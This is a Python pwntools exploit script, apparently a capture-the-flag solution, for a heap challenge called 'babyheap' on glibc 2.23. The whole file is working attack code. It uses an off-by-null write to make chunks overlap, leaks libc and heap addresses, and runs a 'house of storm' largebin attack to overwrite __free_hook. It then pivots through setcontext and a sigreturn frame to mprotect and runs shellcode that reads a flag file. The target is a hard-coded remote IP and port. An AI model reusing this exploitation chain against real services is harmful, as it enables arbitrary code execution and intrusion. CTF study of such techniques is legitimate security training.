# File: exp.py
# Author: raycp
# Date: 2019-05-29
# Description: exp for babyheap

from pwn import *
from pwn_debug import *

pdbg=pwn_debug("babyheap")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local("./libc-2.23.so")
pdbg.debug("2.23")
pdbg.remote('123.206.174.203', 20001,"./libc-2.23.so")
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")

#membp=pdbg.membp
#print type(pdbg.membp)
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc
#a=IO_FILE_plus()
#print a
#a.show()
#print a._IO_read_base

def add(size):
    p.recvuntil("Choice: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))

def edit(idx,data):
    p.recvuntil("Choice: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Content: ")
    p.send(data)


def delete(idx):
    p.recvuntil("Choice: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))


def show(idx):
    p.recvuntil("Choice: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))


def pwn():

    add(0x10)  #0
    add(0x10)  #1
    add(0x28)  #2
    add(0xa70) #3
    add(0x80)  #4
    add(0x10)  #5
    add(0x430) #6
    add(0x10)  #7

    # step 1 off-by-null
    #pdbg.bp(0x11e7)
    delete(3)
    edit(2,'a'*0x28)
    
    add(0x40)  #3

    add(0x400) #8
    add(0x10)  #9
    add(0x410) #10
    add(0x150) #11
    
    ## step 2 form overlap chunk when 4th chunk freed
    delete(3)
    delete(4)

    ## step 3 leak libc address
    add(0x40)  #3
    show(8) 
    unsorted=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))
    libc_base=unsorted-libc.symbols['main_arena']-0x58
    log.info("libc base: %s"%(hex(libc_base)))
    setcontext_addr=libc_base+libc.symbols['setcontext']
    mprotect_addr=libc_base+libc.symbols['mprotect']
    #delete(4)

    ## step 4 leak heap address
    #pdbg.bp(0x13a0)
    add(0x400) #4
    add(0x6a0) #12
    delete(6)
    delete(4)
    show(8)
    heap_base=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))-0xba0
    log.info("heap base: %s"%(hex(heap_base)))
    #pdbg.bp(0x10fe)
    delete(3)
    delete(12)
    add(0xb00) #3
    add(0x430) #4

    ## step 5 fix chunk metadata
    #pdbg.bp(0x11e7)
    payload="\x00"*0x40+p64(0)+p64(0x411)+'\x00'*0x400+p64(0)+p64(0x21)+'\x00'*0x10+p64(0)+p64(0x421)+'\x00'*0x410+p64(0)+p64(0x271)+'\n'
    edit(3,payload)

    
    ## step 6 free largebin into largebin array and unsorted bin
    delete(8)
    delete(4)
    add(0x430) #4
    delete(10) # free large bin with size 0x420 into unsorted bin 

    
    ## step 7 prepare large bin and unsorted bin
    free_hook=libc_base+libc.symbols['__free_hook']
    target_out=free_hook-0x10
    fake_bk_nextsize=target_out-5+8-0x20
    fake_bk=target_out+8
    fake_large=p64(0)+p64(0x411)+p64(0)+p64(fake_bk)+p64(0)+p64(fake_bk_nextsize)
    fake_large=fake_large.ljust(0x410,'\x00')
    

    fake_chunk=target_out
    fake_unsorted=p64(0)+p64(0x421)+p64(0)+p64(fake_chunk)
    fake_unsorted=fake_unsorted.ljust(0x420,'\x00')

    ##  step 8 house of storm attack
    #pdbg.bp(0x10fe)
    payload="\x00"*0x40+fake_large+p64(0x410)+p64(0x20)+'\x00'*0x10+fake_unsorted+p64(0x420)+p64(0x270)+'\n'
    edit(3,payload)
    add(0x48)  #6 __free_hook malloc out

    #pdbg.bp(0x11e7)
    shellcode=asm(shellcraft.amd64.open("./flag",0))
    shellcode+=asm(shellcraft.amd64.read(3,heap_base+0x100,0x30))
    shellcode+=asm(shellcraft.amd64.write(1,heap_base+0x100,0x30))
    
    
    heap_addr=heap_base+0xbb0 ## store sigreturn frame and shellcode, fake stack
    frame = SigreturnFrame()
    frame.rdi=heap_base&0xfffffffffffff000
    frame.rsi=0x1000
    frame.rdx=7
    frame.rip=mprotect_addr
    frame.rsp=heap_addr+len(str(frame))
    payload=str(frame)+p64(heap_addr+len(str(frame))+8)+shellcode
    log.info("heap addr: %s"%(hex(heap_addr)))

    ## step 9 deploy sigreturn frame and  shellcode 
    edit(4,payload+'\n')
    #pdbg.bp(0x12bd,command=["b *%s"%(hex(setcontext_addr+53))])

    ## step 10 overwrite __free_hook
    edit(6,p64(setcontext_addr+53)+'\n')
   
    ## step 11 trigger free to read flag
    p.recvuntil("Choice: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline("4")

    p.interactive() 

if __name__ == '__main__':
   pwn()


